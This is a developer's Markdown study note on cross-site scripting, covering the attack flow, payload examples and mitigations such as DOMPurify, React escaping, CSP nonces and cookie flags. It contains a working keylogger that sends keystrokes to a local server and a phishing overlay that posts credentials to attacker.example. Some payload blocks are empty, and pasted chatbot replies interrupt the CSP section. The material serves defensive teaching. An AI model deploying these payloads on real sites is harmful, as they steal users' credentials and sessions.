# XSS (Cross‑Site Scripting) — Notes for Developers

> **Goal:** Clear, practical notes about XSS — what it is, attack examples, what can go wrong, and how to mitigate it. Suitable for a GitHub `.md` file.

---

## What is XSS?

**Cross‑Site Scripting (XSS)** occurs when an attacker is able to inject malicious scripts (usually JavaScript) into web pages that other users visit. The injected script runs inside the victim's browser with the privileges of the vulnerable site.

### Short definition
XSS lets attackers run arbitrary JavaScript in other users' browsers by exploiting failure to properly validate/sanitize user-supplied data.

---

## What can go wrong if XSS executes?

When an attacker runs script in a victim's browser, they can:

- **Steal session cookies** → session hijacking (act as the victim).
- **Perform unauthorized actions** as the victim (e.g., create posts, transfer money if CSRF or unsafe APIs exist).
- **Capture keystrokes** (passwords, OTPs typed on the page).
- **Exfiltrate page content** (sensitive data shown on the page).
- **Show phishing forms or overlays** to capture credentials.
- **Install or trigger further payloads** (chain to more sophisticated attacks).

---

## XSS Attack Flow (Mermaid)

> Paste this into a GitHub README (Mermaid enabled) to visualize.

```mermaid
flowchart TD
  A["👨‍💻 Attacker"]
  B["🌐 Vulnerable Website"]
  C["🧑‍🦱 Victim User"]

  A -->|"1) Injects malicious script (stored/reflected)"| B
  C -->|"2) Visits infected page → script runs in browser"| B
  B -->|"3) Exfiltrates data (cookies, keystrokes, DOM)"| A

```



---

## Realistic attack examples (fixed & explained)

> **Note:** the following code **must never** be used on live systems. These examples are for learning/defense only.

### 1) Reflected / URL-based example (image `onerror`)
A vulnerable page that echoes `?name=` into HTML without sanitization can allow this:

```
?name=
```

**What this does:** the `onerror` handler runs when the `img` fails to load and sends a GET request to the attacker's server with `document.cookie` appended. If the site relies on cookies for auth and they are not `HttpOnly`, the attacker can steal them.

**What could go wrong:** attacker can hijack the session (log in as the user), view or modify account data, or continue living‑session attacks.

---

### 2) Triggering site functions (CSRF-like behaviour)
If the site exposes global JS functions (e.g. `window.createPost`) that perform actions on behalf of the current user, an XSS payload can call them:

Vulnerable URL payload (illustrative):
```
?name=
```

**Why dangerous:** the victim, while authenticated, will execute `createPost` and post content without consent. This demonstrates why allowing arbitrary script execution is dangerous.

---

### 3) Keylogger (fixed example)
Broken/typo-ridden sample — **corrected** and improved below:

```javascript
// Keylogger example (educational only)
(function () {
  var timeout;
  var buffer = '';
  document.querySelector('body').addEventListener('keypress', function(event) {
    if (!event) return;
    clearTimeout(timeout);
    var char = String.fromCharCode(event.which || event.keyCode);
    buffer += char;
    timeout = setTimeout(function() {
      var xhr = new XMLHttpRequest();
      var uri = 'http://localhost:3001/keys?data=' + encodeURIComponent(buffer);
      xhr.open('GET', uri);
      xhr.send();
      buffer = '';
    }, 400);
  });
})();
```

**Effect if executed:** keystrokes get periodically sent to the attacker's server — passwords, OTPs, messages typed into the page.

---

### 4) Exfiltrate full page HTML
```html

```

This will send the page HTML (including any data visible in the DOM) to attacker.example.

---

### 5) Simple phishing example
Attacker injects an overlay form that looks like the site's login and forwards input to the attacker:

```javascript
// Inject overlay login form (example)
var overlay = document.createElement('div');
overlay.innerHTML = '<form id="fake" action="http://attacker.example/collect" method="POST">' +
  '<input name="user"/><input name="pass" type="password"/>' +
  '<button type="submit">Log in</button></form>';
overlay.style.position = 'fixed';
overlay.style.top = '0';
overlay.style.left = '0';
overlay.style.right = '0';
overlay.style.bottom = '0';
overlay.style.background = 'white';
document.body.appendChild(overlay);
```

User sees a legit-looking form and may enter credentials — which are then sent to the attacker.

---

## Why modern browsers do not fully solve XSS
Browsers implement certain defenses (CSP, SameSite, HttpOnly cookies), but they can't fix application logic bugs or bad code patterns. Developer-side protections and careful server configuration are still required.

---

## Mitigation — Practical Checklist

### 1) Escape / Sanitize output
**Never** trust user input. Treat everything untrusted and escape before inserting into HTML.

Prefer using text APIs:
```javascript
// BAD
element.innerHTML = userInput;

// GOOD
element.textContent = userInput;   // renders text, not HTML
```

**Escaping example (corrected):**
```javascript
<script>
  const params = new URLSearchParams(window.location.search);
  const name = params.get('name') || '';
  // Replace < and > to prevent tags from being interpreted
  const sanitized = name.replace(/</g, '&lt;').replace(/>/g, '&gt;');
  document.getElementById('username').textContent = sanitized;
</script>
```
Explanation: This prevents `<script>` tags or event attributes from being treated as HTML. Using `textContent` is even safer.

---

### 2) Use libraries to sanitize HTML when you must accept HTML
If you must render user-provided HTML, use a battle-tested sanitizer like **DOMPurify**.

```javascript
import DOMPurify from 'dompurify';

const safe = DOMPurify.sanitize(userHtml);
element.innerHTML = safe;
```
DOMPurify removes unsafe tags, attributes, and event handlers.

---

### 3) In React / modern frameworks
React escapes values inserted in JSX by default.

```javascript
import React from 'react';

function Greeting() {
  const params = new URLSearchParams(window.location.search);
  const name = params.get('name') || '';
  return (
    <div>
      Welcome {name}
    </div>
  );
}
export default Greeting;
```

If `name` contains `<script>`, React will render it as text (no execution). **Do not** use `dangerouslySetInnerHTML` unless you have sanitized the HTML first with a library like DOMPurify.

**Dangerous example:**
```javascript
<div dangerouslySetInnerHTML={{ __html: someHtmlString }} />
```
This bypasses React's escaping. Use it only with a sanitizer:
```javascript
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(someHtmlString) }} />
```

---


Got you.
Here is a clean, combined CSP + Nonce explanation, keeping your earlier “beautiful CSP section” style — but now merged with the nonce clarification.

Perfect for your notes.

⸻

4) Content Security Policy (CSP)

A CSP reduces the impact of XSS by controlling what resources the browser is allowed to load and execute.

CSP mainly protects by restricting:

⸻

A) Allowed Sources (default-src, script-src)

These directives define where scripts, styles, images, etc. can come from.

Example:

script-src 'self' https://trustedcdn.com;

This means:
	•	Only scripts from your own domain (self)
	•	And the trusted CDN
are allowed.

So if an attacker injects:

<script src="https://evil.com/hack.js"></script>

🚫 Blocked by CSP
The browser refuses to load the script because it’s not an allowed source.

👉 CSP does not stop HTML injection — it stops malicious JavaScript from running.

⸻

B) Script Nonces

Nonces allow safe inline scripts, while blocking all unknown inline scripts.

How it works
	1.	Server generates a fresh random nonce per request
Example: nonce-92bf9c8a23c1e7f
	2.	The nonce appears in:
	•	The CSP header

Content-Security-Policy: script-src 'self' 'nonce-92bf9c8a23c1e7f';


	•	Your inline script tags

<script nonce="92bf9c8a23c1e7f">
  // safe code
</script>


	3.	Browser checks:

Does the script tag’s nonce match the nonce in the CSP header?

✔ Match → Script runs
❌ No match → Script blocked

Why attackers can’t bypass it
	•	The nonce is random
	•	It changes every page load
	•	It’s only known after the HTML is delivered
	•	Attacker cannot guess or obtain it ahead of time

So malicious inline scripts like:

<script>alert('xss')</script>

🚫 Blocked (no nonce)

Even if attacker tries:

<div onclick="stealCookies()"></div>

🚫 Blocked (inline events are disallowed without 'unsafe-inline')

Only scripts with a valid nonce can run — everything else is rejected.

⸻

C) Report-Only Mode

This mode lets you test your policy without breaking anything.
	•	Browser does NOT block violations
	•	Instead, it sends violation reports to your endpoint
	•	Helps you see what would break if you enforced the rules

Once you fine-tune the policy, switch from:

Content-Security-Policy-Report-Only
to
Content-Security-Policy (enforcing mode)

⸻
D) CSP

	•	CSP restricts where scripts can load from
→ Blocks external malicious scripts.
	•	Nonces restrict which inline scripts can run
→ Blocks injected inline JavaScript.
	•	Browser only runs scripts whose nonce matches the CSP header
→ Attackers cannot guess or reuse the nonce.
	•	Report-Only lets you test safely
→ No real-user breakage while tuning rules.

Even if attackers inject HTML, their JavaScript still won’t run.
CSP + Nonces = Strong defense against XSS.

⸻

If you want, I can turn this into a one-page cheat sheet or make it even shorter for exam-style notes.

---
### 5) Cookie flags & secure practices
- **HttpOnly** — prevents JavaScript from reading cookies (`document.cookie`).
- **Secure** — cookie only sent over HTTPS.
- **SameSite** — helps mitigate CSRF (set to `Lax` or `Strict` as appropriate).
Set these flags for session/auth cookies in server-side code.

---

### 6) Avoid `eval()` and similar
`eval()` executes strings as code and multiplies risk if attackers control the string.

Bad:
```javascript
eval(userString);
```
Better:
- Use JSON.parse for JSON.
- Avoid dynamic code execution.

---

## Input vectors to consider
- Form inputs (textareas, inputs)
- URL parts (query params, hash fragment, path segment)
- Headers (some systems reflect headers)
- Third-party content, Markdown rendered to HTML
- Uploads that later get displayed as HTML (e.g., WYSIWYG content)

---

## Developer checklist before deployment
- [ ] Escape all user-provided text when inserting into DOM.
- [ ] Use `textContent` instead of `innerHTML` when possible.
- [ ] Sanitize any HTML with DOMPurify (or server-side equivalent).
- [ ] Implement CSP and iteratively tighten it using `report-uri` / `report-to`.
- [ ] Set cookies with HttpOnly, Secure, and SameSite flags.
- [ ] Avoid global functions that perform privileged actions unless strictly necessary.
- [ ] Review third-party scripts and minimize/externalize them where possible.
- [ ] Add automated tests that attempt to inject typical XSS payloads.

---

## Further reading & tools
- OWASP XSS Cheat Sheet
- DOMPurify GitHub
- CSP Builder / CSP Evaluator
- Browser devtools → Security & Console for CSP/XSS diagnostics

---

## Appendix — Fixed versions of the code snippets you provided

### Fixed brittle snippet (image onerror stealing cookies)
```html
<!-- Example vulnerable echo in a page:
  <div id="greet">Hello, ${name}</div>
  If name comes from URL and is unescaped, attacker can inject HTML.
-->

```

### React example (safe by default)
```javascript
import React from 'react';

function Greeting() {
  const params = new URLSearchParams(window.location.search);
  const name = params.get('name') || '';
  return <div>Welcome {name}</div>;
}
export default Greeting;
```

---

## Final notes
- Treat XSS as both an **engineering** and **design** problem: how data flows from input to output.
- Use defense-in-depth: escaping, sanitization, CSP, secure cookies, and minimal privileged JS surface.
- When testing locally, use realistic payloads from OWASP or security resources, and never test attacks against systems you don't own or have explicit permission to test.

---

*End of notes.*
